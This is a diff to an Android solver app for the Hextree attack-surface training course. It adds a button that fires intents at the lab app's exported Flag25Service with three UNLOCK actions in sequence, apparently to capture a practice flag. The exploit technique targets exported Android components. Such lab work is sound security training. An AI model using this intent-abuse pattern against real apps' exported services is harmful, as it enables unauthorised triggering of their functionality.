@@ -12,11 +12,13 @@ import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
+import android.widget.Toast;
 
 import androidx.activity.EdgeToEdge;
 import androidx.activity.result.ActivityResultLauncher;
@@ -416,6 +418,54 @@ public class MainHextreeSolverActivity extends AppCompatActivity {
                     }
                 }, 5000);
 
+            }
+        });
+
+        // Flag25Activity
+        Button f25 = findViewById(R.id.f25);
+        f25.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag25Solver", "Button Clicked");
+
+                // Register and fire broadcast first
+                BroadcastReceiver receiver = new BroadcastReceiver() {
+                    @Override
+                    public void onReceive(Context context, Intent intent) {
+                        String[] actions = {
+                                "io.hextree.services.UNLOCK1",
+                                "io.hextree.services.UNLOCK2",
+                                "io.hextree.services.UNLOCK3"
+                        };
+
+                        for (int i = 0; i < actions.length; i++) {
+                            final String action = actions[i];
+                            final int index = i + 1;
+                            v.postDelayed(() -> {
+                                Intent serviceIntent = new Intent();
+                                serviceIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
+                                serviceIntent.setAction(action);
+                                Log.v("Flag25Solver", "Starting service " + index + " with action: " + action);
+                                Toast.makeText(context, "Starting service " + index, Toast.LENGTH_SHORT).show();
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                    context.startForegroundService(serviceIntent);
+                                } else {
+                                    context.startService(serviceIntent);
+                                }
+                            }, i * 5000L + 2000L);
+                        }
+                    }
+                };
+
+                IntentFilter filter = new IntentFilter("com.sntrain.kribas.hextree1.START_FLAG25");
+                registerReceiver(receiver, filter,RECEIVER_EXPORTED);
+                sendBroadcast(new Intent("com.sntrain.kribas.hextree1.START_FLAG25"));
+
+                // Open target app concurrently
+                Intent app = new Intent();
+                app.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.MainActivity");
+                app.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(app);
             }
         });
     }
